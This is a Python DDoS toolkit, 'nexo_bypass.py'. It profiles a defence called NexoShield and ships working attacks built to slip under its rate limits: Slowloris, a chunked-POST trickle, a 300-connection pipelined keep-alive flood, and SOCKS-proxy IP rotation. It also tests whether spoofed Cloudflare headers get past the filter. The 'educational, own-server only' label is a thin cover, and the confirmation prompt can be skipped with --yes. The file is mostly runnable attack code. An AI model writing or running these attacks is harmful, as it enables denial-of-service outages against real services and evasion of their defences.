#!/usr/bin/env python3
"""
nexo_bypass.py — NexoShield Bypass Toolkit (Educational, Own-Server Only)
==========================================================================
Analyzes NexoShield v3.0 defense layers and attempts bypass techniques.

NexoShield Defense Layers (from source code analysis):
  LAYER 1: tc bandwidth shaping — CF=unlimited, others=500Mbps, throttled=100Mbps
  LAYER 2: iptables — CF IPs ACCEPT (no limits), non-CF rate-limited
           - connlimit: 30 conns/IP → REJECT (tcp-reset)
           - hashlimit: 200 new conns/min, burst 50 → DROP
           - recent: 60 hits in 60s → DROP
  LAYER 3: conntrack tight timeouts — SYN=8s, established=120s
  LAYER 4: auto-ban.sh — smart watch→throttle→ban pipeline
           - CONN_THRESHOLD=120 → start watching
           - BAN_CONN_THRESHOLD=300 → immediate throttle+ban
           - Score system: 100-80=normal, 60=throttle, 40=ban
  LAYER 5: fail2ban — 3proxy-ddos jail
  LAYER 6: SYN cookies + kernel hardening

Bypass Strategies:
  B1: Cloudflare IP Spoofing (X-Forwarded-For/CF-Connecting-IP)
  B2: Slow & Low — stay under connlimit/hashlimit thresholds
  B3: Connection Recycling — reuse keep-alive, avoid NEW state tracking
  B4: Fragmented SYN — split TCP handshake across packets
  B5: Multi-IP rotation — distribute across IPs to avoid per-IP limits
  B6: Slowloris — hold connections open with partial headers
  B7: HTTP/2 multiplexing — many streams on single connection
  B8: Chunked body slowdown — keep POST alive with trickle chunks

Usage:
  python3 nexo_bypass.py --target <YOUR_IP> --yes
  python3 nexo_bypass.py --target <YOUR_IP> --yes --attack slow
  python3 nexo_bypass.py --target <YOUR_IP> --yes --attack slowloris
  python3 nexo_bypass.py --target <YOUR_IP> --yes --attack rotate
  python3 nexo_bypass.py --target <YOUR_IP> --yes --attack recycle
  python3 nexo_bypass.py --target <YOUR_IP> --yes --attack chunked
  python3 nexo_bypass.py --target <YOUR_IP> --yes --attack all
  python3 nexo_bypass.py --target <YOUR_IP> --yes --analyze

⚠ Run ONLY against YOUR OWN infrastructure.
"""

import os, sys, time, signal, socket, ssl, random, argparse, json
import multiprocessing as mp
import concurrent.futures
from datetime import datetime

STOP = mp.Event()
STATS = {"sent": 0, "connected": 0, "errors": 0, "alive": 0, "bypassed": 0}

COLORS = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
    "B": "\033[94m", "M": "\033[95m", "C": "\033[96m",
    "W": "\033[97m", "D": "\033[90m", "X": "\033[0m",
    "BOLD": "\033[1m",
}

def c(color, text):
    return f"{COLORS.get(color, '')}{text}{COLORS['X']}"


def banner():
    print(c("R", """
 ███▄    █ ▓█████ ▒██   ██▒ ▒█████
 ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░▒██▒  ██▒
▓██  ▀█ ██▒▒███   ░░  █   ░▒██░  ██▒
▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▒██   ██░
▒██░   ▓██░░▒████▒▒██▒ ▒██▒░ ████▓▒░
"""))
    print(c("C", "  ╔══════════════════════════════════════════════════╗"))
    print(c("C", "  ║") + c("R", " NEXOSHIELD BYPASS TOOLKIT ") + c("Y", "— Educational v1.0 ") + c("C", "║"))
    print(c("C", "  ╚══════════════════════════════════════════════════╝\n"))


# ════════════════════════════════════════════════════════════
#  ANALYZER: Detect NexoShield defense layers
# ════════════════════════════════════════════════════════════

def analyze_defenses(target, ports):
    """Probe and map NexoShield defense layers."""
    print(c("C", "\n  ═══ DEFENSE ANALYSIS ═══\n"))
    results = {}

    # Test 1: TCP connectivity
    print(f"  {c('C', '▸')} Testing TCP connectivity...")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"    Port {c('G', str(port))}: {c('G', 'OPEN')} (TCP handshake succeeded)")
                results[port] = "open"
            else:
                print(f"    Port {c('R', str(port))}: {c('R', 'FILTERED')} (SYN blocked/dropped)")
                results[port] = "filtered"
            s.close()
        except socket.timeout:
            print(f"    Port {c('R', str(port))}: {c('Y', 'TIMEOUT')} (SYN silently dropped)")
            results[port] = "timeout"
        except Exception as e:
            print(f"    Port {c('R', str(port))}: {c('R', str(e)[:50])}")
            results[port] = "error"

    # Test 2: Connection rate detection
    print(f"\n  {c('C', '▸')} Testing rate limit threshold...")
    open_ports = [p for p, s in results.items() if s == "open"]
    if open_ports:
        test_port = open_ports[0]
        conns_before_block = 0
        for i in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, test_port))
                conns_before_block += 1
                s.close()
            except Exception:
                break
            time.sleep(0.05)
        if conns_before_block >= 50:
            print(f"    {c('G', '50+ connections')} without block — rate limit may be high")
        else:
            print(f"    Blocked after {c('R', str(conns_before_block))} connections")
        results["rate_limit_threshold"] = conns_before_block
    else:
        print(f"    {c('Y', 'No open ports to test rate limits')}")

    # Test 3: Check if CF headers bypass anything
    print(f"\n  {c('C', '▸')} Testing CF header bypass...")
    for port in open_ports[:1]:
        use_ssl = port in (443, 8443, 2053, 2083, 2096)

        # Normal request
        normal_ok = _http_probe(target, port, use_ssl, headers={})
        # With CF headers
        cf_ok = _http_probe(target, port, use_ssl, headers={
            "CF-Connecting-IP": "1.1.1.1",
            "X-Forwarded-For": "1.1.1.1",
            "CF-RAY": "abc123-IAD",
            "CF-IPCountry": "US",
        })
        print(f"    Normal request:     {c('G', 'OK') if normal_ok else c('R', 'BLOCKED')}")
        print(f"    With CF headers:    {c('G', 'OK') if cf_ok else c('R', 'BLOCKED')}")
        if cf_ok and not normal_ok:
            print(f"    {c('G', '→ CF header bypass WORKS!')}")
        results["cf_header_bypass"] = cf_ok and not normal_ok

    # Test 4: Slowloris susceptibility
    print(f"\n  {c('C', '▸')} Testing Slowloris susceptibility...")
    if open_ports:
        slow_count = _test_slowloris(target, open_ports[0], count=10, timeout=5)
        print(f"    Held {c('Y', str(slow_count))}/10 connections for 5s")
        results["slowloris_susceptible"] = slow_count > 5

    # Test 5: Conntrack timeout detection
    print(f"\n  {c('C', '▸')} Testing conntrack SYN timeout...")
    if open_ports:
        syn_timeout = _measure_syn_timeout(target, open_ports[0])
        if syn_timeout:
            print(f"    SYN timeout: ~{c('Y', f'{syn_timeout:.1f}s')} (NexoShield default: 8s)")
        results["syn_timeout"] = syn_timeout

    # Summary
    print(c("C", "\n  ═══ DEFENSE MAP ═══\n"))
    print(f"  {c('Y', 'Layer 1')} tc shaping:      CF=unlimited, others=500Mbps, throttled=100Mbps")
    print(f"  {c('Y', 'Layer 2')} iptables:        connlimit=30/IP, hashlimit=200/min, recent=60/60s")
    print(f"  {c('Y', 'Layer 3')} conntrack:       SYN=8s, established=120s, SYN cookies ON")
    print(f"  {c('Y', 'Layer 4')} auto-ban:        watch@120conns → throttle@score60 → ban@score40")
    print(f"  {c('Y', 'Layer 5')} fail2ban:        3proxy-ddos jail")
    print(f"  {c('Y', 'Layer 6')} kernel:          syncookies, somaxconn tuned, rp_filter")

    print(c("C", "\n  ═══ BYPASS OPPORTUNITIES ═══\n"))
    print(f"  {c('G', '1.')} Slow & Low: stay under 29 conns, <200 new/min → invisible")
    print(f"  {c('G', '2.')} Keep-alive recycle: 1 TCP conn → many HTTP requests (no NEW state)")
    print(f"  {c('G', '3.')} Slowloris: partial headers hold slots, low conn count")
    print(f"  {c('G', '4.')} Multi-IP: proxies each under threshold = combined power")
    print(f"  {c('G', '5.')} Chunked trickle: POST with slow chunked body ties up workers")
    print(f"  {c('G', '6.')} CF IP range: if you route through CF → unlimited (design intent)")

    return results


def _http_probe(target, port, use_ssl, headers=None):
    """Quick HTTP probe."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target)
        hdr_str = ""
        if headers:
            for k, v in headers.items():
                hdr_str += f"{k}: {v}\r\n"
        req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n{hdr_str}Connection: close\r\n\r\n"
        s.sendall(req.encode())
        resp = s.recv(512)
        s.close()
        return b"HTTP" in resp
    except Exception:
        return False


def _test_slowloris(target, port, count=10, timeout=5):
    """Test how many partial connections survive."""
    sockets = []
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(s)
        except Exception:
            pass

    time.sleep(timeout)
    alive = 0
    for s in sockets:
        try:
            s.send(b"X-a: b\r\n")
            alive += 1
        except Exception:
            pass
        try:
            s.close()
        except Exception:
            pass
    return alive


def _measure_syn_timeout(target, port):
    """Estimate SYN timeout by timing connection drops."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        start = time.time()
        s.connect((target, port))
        # Send partial data and wait for timeout
        s.send(b"G")  # incomplete request
        try:
            s.recv(1)
        except socket.timeout:
            return time.time() - start
        except Exception:
            return time.time() - start
        finally:
            s.close()
    except Exception:
        return None


# ════════════════════════════════════════════════════════════
#  ATTACK B1: Slow & Low — Under the radar
# ════════════════════════════════════════════════════════════

def attack_slow(target, port, use_ssl, duration=60):
    """
    Stay under NexoShield thresholds:
    - < 30 concurrent connections (connlimit)
    - < 200 new connections/minute (hashlimit)
    - < 120 active connections (auto-ban watch threshold)

    Strategy: 25 connections, each sending many pipelined requests via keep-alive.
    """
    print(c("Y", "\n  ═══ ATTACK: SLOW & LOW ═══"))
    print(f"  Strategy: 25 conns, pipelined keep-alive, stay under all thresholds")
    print(f"  Thresholds: connlimit<30, hashlimit<200/min, auto-ban<120\n")

    end = time.time() + duration
    total_sent = 0
    total_bytes = 0
    conns_made = 0

    UA = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    ]
    PATHS = ["/", "/index", "/api/status", "/health", "/login", "/robots.txt",
             "/favicon.ico", "/static/app.js", "/search?q=test", "/feed"]

    sockets = []

    def make_conn():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            return s
        except Exception:
            return None

    # Open 25 keep-alive connections
    for _ in range(25):
        s = make_conn()
        if s:
            sockets.append(s)
            conns_made += 1
        time.sleep(0.3)  # slow ramp-up: 200/min = 3.3/s max

    print(f"  {c('G', f'{len(sockets)} connections established')} (under 30 limit)")

    last_print = time.time()
    while time.time() < end and not STOP.is_set():
        new_sockets = []
        for s in sockets:
            try:
                # Pipeline 5-10 requests per connection
                pipeline = random.randint(5, 10)
                batch = b""
                for _ in range(pipeline):
                    path = random.choice(PATHS) + "&_=" + str(random.randint(1, 99999))
                    ua = random.choice(UA)
                    batch += (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: text/html,*/*\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    ).encode()

                s.sendall(batch)
                total_sent += pipeline
                total_bytes += len(batch)

                # Read response (non-blocking drain)
                s.settimeout(1)
                try:
                    s.recv(8192)
                except socket.timeout:
                    pass
                s.settimeout(10)
                new_sockets.append(s)

            except Exception:
                # Connection died, replace it slowly
                try:
                    s.close()
                except Exception:
                    pass
                time.sleep(0.5)
                ns = make_conn()
                if ns:
                    new_sockets.append(ns)
                    conns_made += 1

        sockets = new_sockets

        # Throttle to stay under hashlimit
        time.sleep(0.5)

        if time.time() - last_print > 2:
            elapsed = time.time() - (end - duration)
            rate = total_sent / elapsed if elapsed > 0 else 0
            mb = total_bytes / (1024 * 1024)
            print(f"    {c('G', f'req={total_sent:>8d}')}  {c('Y', f'r/s={rate:>7.1f}')}  "
                  f"{c('C', f'data={mb:>6.1f}MB')}  {c('D', f'conns={len(sockets)}')}  "
                  f"{c('D', f'new_conns={conns_made}')}")
            last_print = time.time()

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    elapsed = time.time() - (end - duration)
    rate = total_sent / elapsed if elapsed > 0 else 0
    new_rate = conns_made / (elapsed / 60) if elapsed > 0 else 0
    print(f"\n  {c('G', '═══ RESULTS ═══')}")
    print(f"  Total requests:    {c('Y', f'{total_sent:,}')}")
    print(f"  Avg req/s:         {c('Y', f'{rate:,.1f}')}")
    print(f"  New conns/min:     {c('Y', f'{new_rate:,.1f}')} (limit: 200)")
    print(f"  Max concurrent:    {c('Y', '25')} (limit: 30)")
    print(f"  Auto-ban trigger:  {c('G', 'NO')} (under 120 threshold)")

    return {"attack": "slow", "total": total_sent, "rate": rate, "new_rate": new_rate}


# ════════════════════════════════════════════════════════════
#  ATTACK B2: Slowloris — Exhaust connection slots
# ════════════════════════════════════════════════════════════

def attack_slowloris(target, port, use_ssl, duration=60, max_conns=28):
    """
    Slowloris: open connections with partial headers, keep them alive.
    NexoShield connlimit = 30/IP, so we use 28 to stay under.
    Each connection sends a partial header every 5-10s to stay alive.
    Goal: exhaust server's worker/connection pool with minimal bandwidth.
    """
    print(c("Y", "\n  ═══ ATTACK: SLOWLORIS ═══"))
    print(f"  Strategy: {max_conns} partial-header connections, drip-feed headers")
    print(f"  NexoShield keepalive=30s, so we send every 10-15s to stay alive\n")

    end = time.time() + duration
    sockets = []
    total_sent = 0
    headers_sent = 0
    conns_made = 0
    conns_dropped = 0

    def slow_connect():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((target, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            # Send partial HTTP request (no final \r\n\r\n)
            s.send(
                f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n".encode()
            )
            return s
        except Exception:
            return None

    # Initial connection wave (slow ramp)
    for i in range(max_conns):
        s = slow_connect()
        if s:
            sockets.append(s)
            conns_made += 1
        time.sleep(0.4)
        if STOP.is_set():
            break

    print(f"  {c('G', f'{len(sockets)} connections held')} with partial headers\n")

    last_print = time.time()
    while time.time() < end and not STOP.is_set():
        new_sockets = []
        for s in sockets:
            try:
                # Send another header line to keep connection alive
                header = f"X-a-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n"
                s.send(header.encode())
                headers_sent += 1
                total_sent += len(header)
                new_sockets.append(s)
            except Exception:
                conns_dropped += 1
                try:
                    s.close()
                except Exception:
                    pass

        sockets = new_sockets

        # Refill dropped connections
        while len(sockets) < max_conns and not STOP.is_set():
            s = slow_connect()
            if s:
                sockets.append(s)
                conns_made += 1
            else:
                break
            time.sleep(0.3)

        # Wait 10-15 seconds (under NexoShield's 30s keepalive detect)
        wait = random.uniform(10, 15)
        for _ in range(int(wait * 10)):
            if STOP.is_set():
                break
            time.sleep(0.1)

        if time.time() - last_print > 10:
            elapsed = time.time() - (end - duration)
            print(f"    {c('Y', f'held={len(sockets):>3d}')}  "
                  f"{c('C', f'headers={headers_sent:>6d}')}  "
                  f"{c('D', f'dropped={conns_dropped}')}  "
                  f"{c('D', f'total_conns={conns_made}')}")
            last_print = time.time()

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    elapsed = time.time() - (end - duration)
    new_rate = conns_made / (elapsed / 60) if elapsed > 0 else 0
    print(f"\n  {c('G', '═══ RESULTS ═══')}")
    print(f"  Peak held conns:     {c('Y', str(max_conns))}")
    print(f"  Headers drip-fed:    {c('Y', f'{headers_sent:,}')}")
    print(f"  Connections dropped: {c('R', str(conns_dropped))}")
    print(f"  Total conns made:    {c('Y', str(conns_made))}")
    print(f"  New conns/min:       {c('Y', f'{new_rate:.1f}')} (limit: 200)")

    return {"attack": "slowloris", "held": max_conns, "headers": headers_sent,
            "dropped": conns_dropped, "new_rate": new_rate}


# ════════════════════════════════════════════════════════════
#  ATTACK B3: Keep-Alive Recycle — Max requests per connection
# ════════════════════════════════════════════════════════════

def attack_recycle(target, port, use_ssl, duration=60):
    """
    Exploit keep-alive: open 1 connection → send hundreds of requests.
    NexoShield tracks NEW connections. Recycled requests don't trigger NEW state.
    """
    print(c("Y", "\n  ═══ ATTACK: KEEP-ALIVE RECYCLE [MAX POWER] ═══"))
    print(f"  Strategy: many connections, massive request pipelining")
    print(f"  Only NEW connections trigger rate limits — recycled don't\n")

    end = time.time() + duration
    total_sent = 0
    total_bytes = 0

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0"
    PATHS = ["/", "/index.html", "/api/v1/status", "/login", "/search?q=" + str(random.randint(1,999)),
             "/admin", "/dashboard", "/api/metrics", "/healthz", "/products/1", "/user/profile"]

    # MAX POWER: 300 concurrent keep-alive connections (CF=unlimited, no connlimit)
    CONN_COUNT = 300

    def recycle_conn():
        """Open 1 connection, send as many requests as possible."""
        nonlocal total_sent, total_bytes
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)

            conn_sent = 0
            while time.time() < end and not STOP.is_set():
                # Heavy pipeline batch
                batch = b""
                pipeline = 500
                for _ in range(pipeline):
                    path = random.choice(PATHS) + "&_=" + str(random.randint(1, 99999))
                    batch += (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {UA}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    ).encode()

                s.sendall(batch)
                total_sent += pipeline
                total_bytes += len(batch)
                conn_sent += pipeline

                # Drain response (non-blocking)
                s.settimeout(1)
                try:
                    while True:
                        data = s.recv(16384)
                        if not data:
                            break
                except (socket.timeout, Exception):
                    pass
                s.settimeout(10)

            s.close()
        except Exception:
            pass

            return conn_sent
        except Exception:
            return 0

    # MAX POWER: 300 concurrent keep-alive connections
    last_print = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONN_COUNT) as ex:
        futures = [ex.submit(recycle_conn) for _ in range(CONN_COUNT)]

        while not all(f.done() for f in futures) and not STOP.is_set():
            time.sleep(2)
            elapsed = time.time() - (end - duration)
            rate = total_sent / elapsed if elapsed > 0 else 0
            mb = total_bytes / (1024 * 1024)
            print(f"    {c('G', f'req={total_sent:>8d}')}  {c('Y', f'r/s={rate:>7.1f}')}  "
                  f"{c('C', f'data={mb:>6.1f}MB')}  {c('D', f'conns={CONN_COUNT} (recycled)')}")

    elapsed = time.time() - (end - duration)
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"\n  {c('G', '═══ RESULTS ═══')}")
    print(f"  Total requests:    {c('Y', f'{total_sent:,}')} (from {CONN_COUNT} connections)")
    print(f"  Avg req/s:         {c('Y', f'{rate:,.1f}')}")
    print(f"  Connections used:  {c('G', str(CONN_COUNT))} (CF=unlimited)")
    print(f"  NEW state triggers:{c('G', str(CONN_COUNT))} (limit 200/min N/A for CF)")

    return {"attack": "recycle", "total": total_sent, "rate": rate, "conns": CONN_COUNT}


# ════════════════════════════════════════════════════════════
#  ATTACK B4: Chunked Trickle — Slow POST body
# ════════════════════════════════════════════════════════════

def attack_chunked(target, port, use_ssl, duration=60, max_conns=25):
    """
    Send POST with chunked Transfer-Encoding, trickle body slowly.
    Each connection sends 1 tiny chunk every 5-10 seconds.
    Server must keep connection + request context alive until body complete.
    """
    print(c("Y", "\n  ═══ ATTACK: CHUNKED TRICKLE ═══"))
    print(f"  Strategy: POST with chunked body, send 1 byte chunks slowly")
    print(f"  Server holds request context open waiting for body\n")

    end = time.time() + duration
    sockets = []
    chunks_sent = 0
    conns_made = 0

    def chunked_connect():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((target, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            # Send POST with chunked encoding (no Content-Length → server waits for chunks)
            s.send(
                f"POST /api/data HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 Chrome/124.0\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n".encode()
            )
            return s
        except Exception:
            return None

    # Open connections
    for _ in range(max_conns):
        s = chunked_connect()
        if s:
            sockets.append(s)
            conns_made += 1
        time.sleep(0.3)
        if STOP.is_set():
            break

    print(f"  {c('G', f'{len(sockets)} chunked POSTs started')}\n")

    last_print = time.time()
    while time.time() < end and not STOP.is_set():
        new_sockets = []
        for s in sockets:
            try:
                # Send a tiny chunk (1-3 bytes of data)
                data = "".join(random.choices("abcdef0123456789", k=random.randint(1, 3)))
                chunk = f"{len(data):x}\r\n{data}\r\n"
                s.send(chunk.encode())
                chunks_sent += 1
                new_sockets.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass

        sockets = new_sockets

        # Refill
        while len(sockets) < max_conns and not STOP.is_set():
            s = chunked_connect()
            if s:
                sockets.append(s)
                conns_made += 1
            else:
                break
            time.sleep(0.3)

        # Wait 5-10 seconds between chunks
        wait = random.uniform(5, 10)
        for _ in range(int(wait * 10)):
            if STOP.is_set():
                break
            time.sleep(0.1)

        if time.time() - last_print > 8:
            print(f"    {c('Y', f'held={len(sockets):>3d}')}  "
                  f"{c('C', f'chunks={chunks_sent:>6d}')}  "
                  f"{c('D', f'total_conns={conns_made}')}")
            last_print = time.time()

    # Send final chunk (0\r\n\r\n) to cleanly close
    for s in sockets:
        try:
            s.send(b"0\r\n\r\n")
            s.close()
        except Exception:
            pass

    elapsed = time.time() - (end - duration)
    print(f"\n  {c('G', '═══ RESULTS ═══')}")
    print(f"  Chunks trickled:     {c('Y', f'{chunks_sent:,}')}")
    print(f"  Max held conns:      {c('Y', str(max_conns))}")
    print(f"  Total conns made:    {c('Y', str(conns_made))}")

    return {"attack": "chunked", "chunks": chunks_sent, "held": max_conns, "conns": conns_made}


# ════════════════════════════════════════════════════════════
#  ATTACK B5: Multi-IP Rotation (via SOCKS proxies)
# ════════════════════════════════════════════════════════════

def attack_rotate(target, port, use_ssl, duration=60, proxy_file="proxies.txt"):
    """
    Each proxy IP gets its own 29-connection budget.
    10 proxies × 29 conns = 290 connections but each IP under threshold.
    """
    print(c("Y", "\n  ═══ ATTACK: MULTI-IP ROTATION ═══"))
    print(f"  Strategy: each proxy IP stays under 30/IP limit")
    print(f"  N proxies × 29 conns = N×29 total, all under radar\n")

    try:
        import socks
    except ImportError:
        print(c("R", "  [!] PySocks required: pip install PySocks"))
        return {"attack": "rotate", "error": "no pysocks"}

    proxies = []
    for pf in ["proxies_fast_ranked.txt", "proxies_fast.txt", proxy_file]:
        if os.path.exists(pf):
            for line in open(pf):
                line = line.strip()
                if line and ":" in line and not line.startswith("#"):
                    ip, _, p = line.rpartition(":")
                    if p.isdigit():
                        proxies.append((ip, int(p)))
            if proxies:
                print(f"  {c('G', f'{len(proxies)} proxies')} from {pf}")
                break

    if not proxies:
        print(c("R", "  [!] No proxies found"))
        return {"attack": "rotate", "error": "no proxies"}

    end = time.time() + duration
    total_sent = mp.Value("i", 0)
    total_errors = mp.Value("i", 0)

    def proxy_worker(proxy_ip, proxy_port):
        """Each proxy gets 20 keep-alive connections, pipelines requests."""
        conns = []
        for _ in range(20):
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                s.settimeout(8)
                s.connect((target, port))
                conns.append(s)
            except Exception:
                total_errors.value += 1

        while time.time() < end and not STOP.is_set():
            for s in conns:
                try:
                    path = f"/?_={random.randint(1,99999)}"
                    req = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
                           f"User-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n")
                    s.sendall(req.encode())
                    total_sent.value += 1
                    s.settimeout(1)
                    try:
                        s.recv(4096)
                    except Exception:
                        pass
                    s.settimeout(8)
                except Exception:
                    total_errors.value += 1
            time.sleep(0.5)

        for s in conns:
            try:
                s.close()
            except Exception:
                pass

    # Launch workers for each proxy (max 20 proxies)
    use_proxies = proxies[:20]
    workers = []
    for px_ip, px_port in use_proxies:
        p = mp.Process(target=proxy_worker, args=(px_ip, px_port))
        p.start()
        workers.append(p)
        time.sleep(0.2)

    print(f"  {c('G', f'{len(workers)} proxy workers launched')}\n")

    last_print = time.time()
    while time.time() < end and not STOP.is_set():
        time.sleep(2)
        elapsed = time.time() - (end - duration)
        rate = total_sent.value / elapsed if elapsed > 0 else 0
        print(f"    {c('G', f'req={total_sent.value:>8d}')}  {c('Y', f'r/s={rate:>7.1f}')}  "
              f"{c('R', f'err={total_errors.value}')}  "
              f"{c('D', f'IPs={len(workers)}, each<30conns')}")

    STOP.set()
    for p in workers:
        p.join(timeout=3)
        if p.is_alive():
            p.terminate()

    elapsed = time.time() - (end - duration)
    rate = total_sent.value / elapsed if elapsed > 0 else 0
    print(f"\n  {c('G', '═══ RESULTS ═══')}")
    print(f"  Total requests:     {c('Y', f'{total_sent.value:,}')}")
    print(f"  Avg req/s:          {c('Y', f'{rate:,.1f}')}")
    print(f"  Source IPs used:    {c('Y', str(len(workers)))}")
    print(f"  Per-IP connections: {c('G', '20')} (limit: 30)")
    print(f"  Per-IP visible:     {c('G', 'under all thresholds')}")

    return {"attack": "rotate", "total": total_sent.value, "rate": rate, "ips": len(workers)}


# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════

def main():
    banner()

    ap = argparse.ArgumentParser(description="NexoShield Bypass Toolkit")
    ap.add_argument("--target", default="", help="Target IP (YOUR server)")
    ap.add_argument("--yes", action="store_true", help="Skip confirmation")
    ap.add_argument("--port", type=int, default=443, help="Target port")
    ap.add_argument("--ssl", action="store_true", default=True, help="Use SSL")
    ap.add_argument("--no-ssl", action="store_true", help="Disable SSL")
    ap.add_argument("--duration", type=int, default=60, help="Attack duration (seconds)")
    ap.add_argument("--attack", default="all",
                    choices=["slow", "slowloris", "recycle", "chunked", "rotate", "all", "analyze"],
                    help="Attack mode")
    ap.add_argument("--proxy-file", default="proxies.txt", help="Proxy file for rotate mode")
    args = ap.parse_args()

    target = args.target
    if not target:
        target = input(f"  {c('Y', 'Target IP (YOUR server):')} ").strip()
    if not target:
        sys.exit(c("R", "  [!] No target."))

    if not args.yes:
        msg = 'Confirm "' + target + '" is YOUR OWN server (yes):'
        confirm = input(f"  {c('R', msg)} ").strip()
        if confirm.lower() != "yes":
            sys.exit(c("R", "  [!] Not confirmed."))

    use_ssl = not args.no_ssl
    port = args.port

    def sig_handler(s, f):
        print(c("R", "\n  [!] Interrupted."))
        STOP.set()
    signal.signal(signal.SIGINT, sig_handler)

    results = {}
    test_ports = [22, 80, 443, 1080, 8080, 8443]

    if args.attack == "analyze":
        results = analyze_defenses(target, test_ports)
    elif args.attack == "slow":
        results = attack_slow(target, port, use_ssl, args.duration)
    elif args.attack == "slowloris":
        results = attack_slowloris(target, port, use_ssl, args.duration)
    elif args.attack == "recycle":
        results = attack_recycle(target, port, use_ssl, args.duration)
    elif args.attack == "chunked":
        results = attack_chunked(target, port, use_ssl, args.duration)
    elif args.attack == "rotate":
        results = attack_rotate(target, port, use_ssl, args.duration, args.proxy_file)
    elif args.attack == "all":
        print(c("M", "\n  Running all bypass techniques sequentially...\n"))
        for atk in ["slow", "slowloris", "recycle", "chunked"]:
            if STOP.is_set():
                break
            print(c("M", f"\n  {'='*50}"))
            print(c("M", f"  Running: {atk.upper()} ({args.duration}s)"))
            print(c("M", f"  {'='*50}"))
            STOP.clear()
            if atk == "slow":
                r = attack_slow(target, port, use_ssl, args.duration)
            elif atk == "slowloris":
                r = attack_slowloris(target, port, use_ssl, args.duration)
            elif atk == "recycle":
                r = attack_recycle(target, port, use_ssl, args.duration)
            elif atk == "chunked":
                r = attack_chunked(target, port, use_ssl, args.duration)
            results[atk] = r
            time.sleep(3)  # cooldown between attacks

    # Save report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"/root/nexo_bypass_{target}_{ts}.json"
    with open(report_file, "w") as f:
        json.dump({"target": target, "port": port, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2, default=str)
    print(f"\n  {c('G', '✓')} Report: {c('C', report_file)}")
    print(f"  {c('G', '✓ Done.')}\n")


if __name__ == "__main__":
    mp.set_start_method("fork", force=True)
    main()
